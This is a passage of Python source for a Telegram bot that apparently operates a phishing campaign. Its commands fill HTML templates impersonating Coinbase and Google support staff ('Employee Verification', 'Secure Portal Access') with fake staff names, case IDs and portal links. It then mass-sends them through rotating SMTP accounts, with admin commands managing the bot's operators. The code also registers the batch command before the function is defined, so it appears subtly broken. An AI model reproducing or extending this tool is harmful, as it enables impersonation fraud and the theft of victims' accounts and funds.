          "id": int(
               new
          ),
          "user_info": {
               "admin": False,
               "staff_name": "John Doe",
               "portal_url": "example.com",
               "case_id": "00000"
          }
     }
     try:
          with users_file_lock:
               with open(USERS_PATH, 'w') as f:
                    json.dump(USERS, f, indent=4)
          logging.info(f"Admin {uid} added new user {new}.")
          await update.message.reply_text(
               f"[OK]! new user ->: {new} added"
          )
     except Exception as e:
          logging.error(f"Failed to save new user {new} added by admin {uid}: {e}", exc_info=True)
          # Potentially revert USERS[new] if the save failed, though it's tricky if other changes happened.
          # For now, just log and inform admin.
          await update.message.reply_text("An error occurred while saving the new user. Please check logs.")

async def removeuser(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     uid = update.effective_user.id
     if not is_admin(
          uid
     ):
          return
     if len(
          context.args
     ) != 1 or not context.args[0].isdigit():
          return
     rem = context.args[0]
     if rem not in USERS:
          return

     removed_user_data = USERS.pop(rem, None) # Save popped data in case of save failure
     if removed_user_data is None: # Should not happen due to prior check, but good practice
          logging.warning(f"User {rem} was not found when attempting to pop, though initial check passed. Admin: {uid}")
          await update.message.reply_text(f"User {rem} could not be definitively removed. Please check logs.")
          return

     try:
          with users_file_lock:
               with open(USERS_PATH, 'w') as f:
                    json.dump(USERS, f, indent=4)
          logging.info(f"Admin {uid} removed user {rem}.")
          await update.message.reply_text(
               f"[OK]! user with ID: {rem} removed"
          )
     except Exception as e:
          logging.error(f"Failed to save USERS file after removing user {rem} by admin {uid}: {e}", exc_info=True)
          # Attempt to restore the popped user data to the USERS dict if save failed
          USERS[rem] = removed_user_data
          logging.info(f"Attempted to restore user {rem} to USERS dict due to save failure.")
          await update.message.reply_text("An error occurred while saving changes after removing the user. The removal may not have been persisted. Please check logs.")


if __name__ == '__main__':
     app = ApplicationBuilder().token(
          TOKEN
     ).build()
     app.add_handler(
          CommandHandler('start',       start)
     )
     app.add_handler(
          CommandHandler('config',      config)
     )
     app.add_handler(
          CommandHandler('support',     support_cmd)
     )
     app.add_handler(
          CommandHandler(
               'cbemployee',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'cbemployee',
                    'Coinbase Employee Verification'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'cbpanel',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'cbpanel',
                    'Secure Support Portal Access'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'cbticket',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'cbticket',
                    'Coinbase Ticket Update'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'cbcallback',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'callback',
                    'Coinbase Callback Confirmation'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'gemployee',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'gemployee',
                    'Google Support Representative Verification'
               )
          )
     )
     app.add_handler(
          CommandHandler(
               'gpanel',
               lambda u,c: template_cmd(
                    u,
                    c,
                    'gpanel',
                    'Google Secure Portal Access'
               )
          )
     )
     app.add_handler(
          CommandHandler('under',      under)
     )
     app.add_handler(
          CommandHandler('adduser',    adduser)
     )
     app.add_handler(
          CommandHandler('removeuser', removeuser)
     )
     app.add_handler(
          CallbackQueryHandler(button_handler)
     )
     app.add_handler(
          MessageHandler(
               filters.TEXT & ~filters.COMMAND,
               message_input
          )
     )
     app.add_handler(CommandHandler('sendbatch', send_batch_command))
     print(
          "[!] bot started"
     )
     app.run_polling()

async def send_batch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_authorized(user_id):
          await update.message.reply_text("You are not authorized to use this command.")
          return

     args = context.args
     if len(args) != 4:
          await update.message.reply_text(
               "Usage: /sendbatch <template_short_key> <recipient_email> <count> <service_name>\n"
               "Example: /sendbatch cbemployee test@example.com 10 coinbase\n"
               "Available template keys: cbemployee, cbpanel, cbticket, cbcallback, gemployee, gpanel"
          )
          return

     template_short_key, recipient_email, count_str, service_name = args
     service_name = service_name.lower()

     if template_short_key not in MENU_MAP:
          await update.message.reply_text(f"Invalid template key: {template_short_key}. \nAvailable: {', '.join(MENU_MAP.keys())}")
          return

     try:
          count = int(count_str)
          if count <= 0 or count > 200: # Max 200 emails per batch for safety
               await update.message.reply_text("Count must be between 1 and 200.")
               return
     except ValueError:
          await update.message.reply_text("Invalid count. Must be a number.")
          return

     if service_name not in CONFIG['smtp']:
          await update.message.reply_text(f"Invalid service name: {service_name}. Available: {', '.join(CONFIG['smtp'].keys())}")
          return

     template_actual_key, email_title = MENU_MAP[template_short_key]
     ui = E_ui(user_id)
     if not ui:
          logging.critical(f"User {user_id} in send_batch_command: E_ui returned empty. Cannot proceed.")
          await update.message.reply_text("CRITICAL ERROR: Your user configuration could not be loaded. Batch command aborted. Please contact admin.")
          return
     try:
          tpl = load_template(template_actual_key)
     except FileNotFoundError:
          await update.message.reply_text(f"Template file for {template_actual_key} not found.")
          return

     html_content_template = tpl.replace(
          '{staff_name}',   ui.get('staff_name', 'N/A')
     ).replace(
          '{ticket_number}',ui.get('case_id', 'N/A')
     ).replace(
          '{case}',         ui.get('case_id', 'N/A')
     ).replace(
          '{panel_url}',    ui.get('portal_url', 'N/A')
     ).replace(
          '{portal_link}',  ui.get('portal_url', 'N/A')
     ).replace(
          '{domain}',       ui.get('portal_url', 'N/A')
     )
     # For callback template, it might need special handling if dynamic callback_window is needed per email
     if template_actual_key == 'callback':
          # For batch, using a generic placeholder or requiring it to be pre-set
          html_content_template = html_content_template.replace('{callback_window}', "As per our recent communication")


     all_service_smtps = CONFIG['smtp'][service_name].get('servers')
     if not all_service_smtps:
          await update.message.reply_text(f"No SMTP servers configured for service: {service_name}")
          return

     svc_port = CONFIG['smtp'][service_name]['port']
     disp_name_service = ' ' if service_name == 'coinbase' else service_name.capitalize()

     email_tasks = []
     for i in range(count):
          smtp_server_details = all_service_smtps[i % len(all_service_smtps)] # Cycle through SMTPs

          # Create a unique HTML content if needed, e.g., by adding an email index
          current_html_content = html_content_template.replace("<!-- INDEX -->", f" (Email {i+1}/{count})")
          current_subject = f"{email_title} ({i+1}/{count})"


          smtp_config_for_task = {
               'server':   smtp_server_details['host'],
               'port':     svc_port,
               'username': smtp_server_details['username'],
               'password': smtp_server_details['password'],
               'display':  smtp_server_details['display']
          }

          email_details = {
               'to_email': recipient_email, # Sending to the same recipient for this batch
               'subject': current_subject,
               'html_content': current_html_content,
               'smtp_config': smtp_config_for_task,
               'display_name': disp_name_service,
               'update': update # Pass update object for potential replies from worker (though minimized)
          }
          email_tasks.append(email_details)

     logging.info(f"User {user_id} initiating batch send: {count} emails to {recipient_email} using {service_name} SMTPs.")
     await update.message.reply_text(f"Starting batch send of {count} emails to `{recipient_email}` using {service_name} SMTPs. This may take a while...")

     num_threads = min(count, len(all_service_smtps) * 2, 10) # Limit threads: min(count, num_smtps*2, max_cap)
     logging.debug(f"Batch send for user {user_id}: Using {num_threads} threads for {count} emails.")

     results = []
     # We need to run asyncio-compatible function (send_email_worker) in threads.
     # ThreadPoolExecutor is for blocking IO. For async functions, it's more complex.
     # A simple approach for now: Use run_coroutine_threadsafe if the executor was outside an event loop,
     # or just directly await if tasks are managed carefully.
     # Given send_email_worker is async, and this command is async, direct awaiting in a loop is an option,
     # but doesn't give easy concurrency with ThreadPoolExecutor.
     # A better pattern for running async functions concurrently: asyncio.gather
     # However, send_email_worker itself has blocking `smtp_locks[smtp_key].acquire()`.
     # This makes it a mix. For simplicity with existing `send_email` (blocking SMTP):
     # We'll use ThreadPoolExecutor and wrap the async call.

     try:
          loop = asyncio.get_running_loop() # Use get_running_loop in async context
     except RuntimeError:
          logging.error("No running event loop found in send_batch_command. This should not happen in an async function.")
          await update.message.reply_text("Critical error: Could not get event loop. Batch aborted.")
          return

     with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
          future_to_task = {
               executor.submit(asyncio.run_coroutine_threadsafe, send_email_worker(task, context), loop): task
               for task in email_tasks
          }

          for future in concurrent.futures.as_completed(future_to_task):
               task_details = future_to_task[future]
               try:
                    # result() on future from run_coroutine_threadsafe gives the actual result of the coroutine
                    # The second .result() call might block, ensure it has a timeout or is handled if worker can hang.
                    # For now, assuming send_email_worker completes.
                    result_from_coro = future.result(timeout=120) # Timeout for coro completion
                    actual_result = result_from_coro.result(timeout=10) # Timeout for result of coro itself
                    logging.debug(f"Batch task for user {user_id} (recipient: {task_details['to_email']}, smtp: {task_details['smtp_config']['display']}) completed with result: {actual_result}")
                    results.append(actual_result)
               except concurrent.futures.TimeoutError:
                    logging.error(f"Timeout waiting for email task to {task_details['to_email']} via {task_details['smtp_config']['display']} for user {user_id}.")
                    results.append(f"TIMEOUTERROR:{task_details['smtp_config']['display']}:{task_details['to_email']}:Task timed out")
               except Exception as exc:
                    logging.error(f"Exception for email task to {task_details['to_email']} via {task_details['smtp_config']['display']} for user {user_id}. Error: {exc}", exc_info=True)
                    results.append(f"ERROR:{task_details['smtp_config']['display']}:{task_details['to_email']}:Execution error: {exc}")

     success_count = sum(1 for r in results if isinstance(r, str) and r.startswith("SUCCESS"))
     cooldown_count = sum(1 for r in results if isinstance(r, str) and r.startswith("COOLDOWN"))
     # Include TIMEOUTERROR in failure_count
     failure_count = sum(1 for r in results if isinstance(r, str) and (r.startswith("FAILURE") or r.startswith("ERROR") or r.startswith("TIMEOUTERROR")))

     summary_message = (
          f"Batch Send Complete:\n"
          f"Total Attempted: {count}\n"
          f"✅ Success: {success_count}\n"
          f"⏳ Cooldown Skips: {cooldown_count}\n"
          f"❌ Failures: {failure_count}\n\n"
     )

     logging.info(f"Batch send complete for user {user_id}. Total: {count}, Success: {success_count}, Cooldown: {cooldown_count}, Failures: {failure_count}")
     # Optionally, list detailed results if not too many
     if count <= 20: # Show details for small batches
          summary_message += "Details:\n" + "\n".join(results)

     # Split long messages if necessary
     if len(summary_message) > 4000:
          parts = [summary_message[i:i + 4000] for i in range(0, len(summary_message), 4000)]
          for part in parts:
               await update.message.reply_text(part)
     else:
          await update.message.reply_text(summary_message)
